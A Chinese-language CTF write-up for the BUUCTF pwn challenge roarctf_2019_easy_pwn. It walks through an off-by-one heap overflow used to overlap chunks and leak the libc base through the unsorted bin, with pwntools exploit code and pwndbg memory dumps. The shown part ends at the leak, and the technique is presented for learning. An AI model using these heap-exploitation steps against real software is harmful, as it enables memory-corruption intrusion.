> 题目来源：BUUCTF-roarctf_2019_easy_pwn
>

# 关键词
+ off-by-one
+ chunk Extend/Overlapping
+ use unsortedbin to leak libc_base
+ heap overflow
+ calloc 分配内存

# 文件保护
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610692598974-919d22b8-728b-4953-bdb3-b7a3aa371ad8.png)

64位程序，保护全开

# IDA静态分析
## 漏洞函数
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610692755600-41b65195-48b6-43cc-aa41-5dcc4de6a23b.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610692894592-c8dd97aa-5c14-467d-875d-ffe0bbd0d94d.png)

当write是输入的size比创建堆块时输入的size大于10时，即可触发off by one

# 思路
> 利用off by one修改next_chunk_size造成chunk Extend/Overlapping，释放next_chunk到unsortedbin，再申请合适大小的chunk从而泄露出libc base，
>

# 思路验证（gdb调试）
> 调试前请先关闭系统的ALSR
>

## 写出基本的exp
```python
#coding=utf-8
from pwn import *
context.log_level='debug'

p=process('./roarctf_2019_easy_pwn')
#p=remote('node3.buuoj.cn',28166)
elf=ELF('./roarctf_2019_easy_pwn')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('./libc-2.23.so')

def choose(choose):
    p.recvuntil('choice: ')
    p.sendline(str(choose))

def create(size):
    choose(1)
    p.recvuntil('size: ')
    p.sendline(str(size))

def write(index,size,content):
    choose(2)
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('content: ')
    p.sendline(str(content))

def drop(index):
    choose(3)
    p.recvuntil('index: ')
    p.sendline(str(index))

def show(index):
    choose(4)
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil('content: ')
    return u64(p.recv(8))
```

## 创建5个所需要的堆块
> tips：所需要的堆块个数边写exp边调整
>

```python
create(0x18) #0  0x18==24
create(0x68) #1
create(0x68) #2
create(0x68) #3
create(0x68) #4
```

heap memory：

> 虚线表示各个堆块的实际大小
>

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
------------------------------------------------------------------------
0x555555757020:	0x0000000000000000	0x0000000000000071 #index1
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090:	0x0000000000000000	0x0000000000000071 #index2
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100:	0x0000000000000000	0x0000000000000071 #index3
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170:	0x0000000000000000	0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0:	0x0000000000000000	0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220:	0x0000000000000000	0x0000000000000000
------------------------------------------------------------------------
pwndbg>
```

由于off by one和对输入控制的不恰当，因此可以通过堆溢出来修改下一个堆块的size：

> 请注意，虽然修改了chunk的size，但是堆块的实际大小并不会发生变化，也就是说可以修改的地方是有限的，
>
> 修改size只是为了接下来的use unsortedbin to leak libc_base作准备。
>

## chunk Extend/Overlapping修改下一个chunk的size
```python
write(0,34,'a'*24+'\xe1') #0
```

修改之后的结果：

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x6161616161616161	0x6161616161616161
------------------------------------------------------------------------
0x555555757020:	0x6161616161616161	0x00000000000000e1 #index1 
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090:	0x0000000000000000	0x0000000000000071 #index2
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100:	0x0000000000000000	0x0000000000000071 #index3
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170:	0x0000000000000000	0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0:	0x0000000000000000	0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220:	0x0000000000000000	0x0000000000000000
------------------------------------------------------------------------
pwndbg>
```

## 释放被修改size的堆块
```python
drop(1) #1
```

接下来释放index为1的chunk：

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x6161616161616161	0x6161616161616161
------------------------------------------------------------------------
0x555555757020:	0x6161616161616161	0x00000000000000e1 #index1 
0x555555757030:	0x00007ffff7dd1b78	0x00007ffff7dd1b78 （1）
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090:	0x0000000000000000	0x0000000000000071 #index2
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100:	0x00000000000000e0	0x0000000000000070 #index3 （2）
    			#index1+index2_size #index3_size
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170:	0x0000000000000000	0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0:	0x0000000000000000	0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220:	0x0000000000000000	0x0000000000000000
------------------------------------------------------------------------
pwndbg>
```

可以看到，由于index1 size的修改，在释放的时候index1的大小被认为是0xe1，因此导致在加入unsortedbin时（2）处发生了变化，这意味着index1和index2都被加入到了unsortedbin（表面上，实际上只有index1）中。现在的bin状况只有unsortedbin：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610695478097-584d39eb-2fad-470f-9137-5315d74d4dda.png)

## 创建可以malloc unsortedbin中的堆块
```python
create(0x68)
```

创建之后堆内存如下：

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x6161616161616161	0x6161616161616161
------------------------------------------------------------------------
0x555555757020:	0x6161616161616161	0x00000000000000e1 #index1 
0x555555757030:	0x0000000000000000	0x0000000000000000 （1）
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090:	0x0000000000000000	0x0000000000000071 #index2
0x5555557570a0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100:	0x00000000000000e0	0x0000000000000070 #index3 （2）
    			#index1+index2_size	#index3_size
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170:	0x0000000000000000	0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0:	0x0000000000000000	0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220:	0x0000000000000000	0x0000000000000000
------------------------------------------------------------------------
pwndbg>
```

由于申请内存使用的是calloc，因此申请后原内存中的数据全部清零。

> [https://www.yuque.com/cyberangel/rg9gdm/xw9ohw](https://www.yuque.com/cyberangel/rg9gdm/xw9ohw)
>
> 当一个较大的（在bin中的）chunk（由于malloc）被分割成两半之后，如果剩下的部分大于MINSIZE，就会被放到unsortedbin中。
>

现在申请内存之后index2仍然在unsortedbin中，可以看到堆块的大小也不是随便输入的。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610697062468-a6f78971-59bd-49db-a1ce-060b80892643.png)

由于index2是被“受牵连释放的”，所以现在可以使用show函数打印（leak）出此地址。

> “受牵连释放”指的是由于chunk Extend/Overlapping而释放掉的chunk，而不是free(index2)
>
> 同时也可以看出，unsortedbin的回收机制已经出现了问题，因为index2实际上没有被释放，而表面上是被释放了
>

## success leak addr
很轻易的可以知道泄露的地址在main_arena+88（0x7ffff7dd1b78）处，而main_arena+88是在libc内存中的，可以根据这一点来leak libc_base：

```python
leak_addr=show(2)
print 'leak_addr:'+hex(leak_addr)
main_arena_offset=0x3c4b20
main_arena_start_offset=0x58
libc_base=leak_addr-main_arena_offset-main_arena_start_offset
print 'libc_base:'+hex(libc_base)
```

leak_addr-0x58指向main_arena的起始地址：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610697877297-46ea18cd-b1de-456c-98bd-0c406925e2e4.png)

leak_addr-0x58-main_arena_offset指向libc_base:

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610698002951-3828a68f-26e9-43bd-8d4d-bd0be08de125.png)

下一小节继续说这道题，附件将在下一小节给出。

